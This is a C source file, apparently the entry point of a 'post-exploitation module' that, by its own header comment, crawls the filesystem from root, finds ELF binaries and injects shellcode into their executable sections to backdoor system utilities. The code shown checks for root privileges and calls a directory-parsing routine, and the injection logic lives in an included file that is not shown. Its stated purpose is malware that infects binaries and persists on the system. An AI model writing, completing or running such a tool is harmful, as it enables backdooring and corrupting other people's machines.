/*

Author : Abhinav Thakur
Email  : compilepeace@gmail.com


Warning : You may not want to run the compiled binary on your host machine as it may lead to 
          corruption or backdooring of all utility programs provided by the distribution and
          eventually leave your system in an unstable/unusable state.


Description : This program is a Post-Exploitation module which crawls the filesystem starting from
              the root node '/' finding all the ELF binaries on the system and injecting shellcode
              in the Executable sections of the ELFs.                         
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "operations.h"
#include "color.h"

#define ROOTNODE "/"



int main(int argc, char *argv[])
{

	// Check for command line arguments
	if (argc < 2)
	{
		fprintf(stderr, RED"[-]"YELLOW" Usage"RESET":"BLUE" %s <PATH>\n", argv[0]);
		exit(0x10);
	}	



	// Get the real and effective user IDs and check if user has root priveleges
	uid_t uid = getuid();
	uid_t euid = geteuid();
	
	if (uid == 0 || euid == 0)
		fprintf(stdout, GREEN"[+] "RESET"Running as root : %d : %d ...\n", uid, euid);
	else
		fprintf(stdout, RED"[-] "RESET"Running as %s ...\n", getenv("USERNAME"));



    char *path = argv[1];         // Replace it with ROOTNODE when done developing


	// Start reccusing directories
	DirEntriesParse(path);



return 0x00;
}

